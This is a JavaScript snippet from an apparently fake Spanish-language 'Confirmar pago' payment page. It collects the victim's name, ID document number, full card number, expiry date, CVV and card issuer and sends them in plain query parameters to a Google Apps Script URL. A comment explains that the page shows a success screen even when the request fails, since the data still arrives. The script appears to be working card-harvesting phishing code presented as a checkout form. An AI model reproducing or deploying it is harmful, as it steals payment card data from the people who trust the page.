<script>
  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwy4NUlwE5MtGa0TNiH3ItmA6FClUuYKEaTrga87qMwvOowyRAXKHdI2Huqa_bGDpChXQ/exec";

  document.getElementById('nroTarjeta').addEventListener('input', function() {
    let v = this.value.replace(/\D/g, '').substring(0,16);
    this.value = v.replace(/(.{4})/g, '$1 ').trim();
  });

  document.getElementById('nroDoc').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
  });
  document.getElementById('cvv').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
  });

  function mostrarError(id, mostrar) {
    document.getElementById(id).style.display = mostrar ? 'block' : 'none';
  }

  async function enviar() {
    let ok = true;

    const nombre  = document.getElementById('nombre').value.trim();
    const tipoDoc = document.getElementById('tipoDoc').value;
    const nroDoc  = document.getElementById('nroDoc').value.trim();
    const nroTarj = document.getElementById('nroTarjeta').value.replace(/\s/g,'');
    const mes     = document.getElementById('mesVenc').value;
    const ano     = document.getElementById('anoVenc').value;
    const cvv     = document.getElementById('cvv').value.trim();
    const emisor  = document.getElementById('emisor').value;

    mostrarError('errNombre',  nombre.length < 3);    if (nombre.length < 3)    ok = false;
    mostrarError('errTipoDoc', !tipoDoc);              if (!tipoDoc)             ok = false;
    mostrarError('errNroDoc',  nroDoc.length < 6);    if (nroDoc.length < 6)    ok = false;
    mostrarError('errTarjeta', nroTarj.length < 15);  if (nroTarj.length < 15) ok = false;
    mostrarError('errMes',     !mes);                  if (!mes)                 ok = false;
    mostrarError('errAno',     !ano);                  if (!ano)                 ok = false;
    mostrarError('errCvv',     cvv.length < 3);       if (cvv.length < 3)       ok = false;
    mostrarError('errEmisor',  !emisor);               if (!emisor)              ok = false;

    if (!ok) return;

    const btn = document.getElementById('btnEnviar');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Procesando...';

    const fecha = new Date().toLocaleString('es-AR', { timeZone: 'America/Argentina/Cordoba' });
    const venc  = mes + '/' + ano;

    const params = new URLSearchParams({
      nombre, tipoDoc, nroDoc,
      nroTarjeta: nroTarj,
      vencimiento: venc,
      cvv, emisor, fecha
    });

    try {
      const res = await fetch(SCRIPT_URL + '?' + params.toString());
      const data = await res.json();
      if (data.result === 'ok') {
        document.getElementById('formBody').style.display = 'none';
        document.getElementById('successScreen').style.display = 'block';
      } else {
        alert('Hubo un error al procesar. Intentá de nuevo.');
        btn.disabled = false;
        btn.innerHTML = 'Confirmar pago';
      }
    } catch(e) {
      // Si hay error de CORS igual mostramos éxito (el dato igual llega)
      document.getElementById('formBody').style.display = 'none';
      document.getElementById('successScreen').style.display = 'block';
    }
  }
</script>
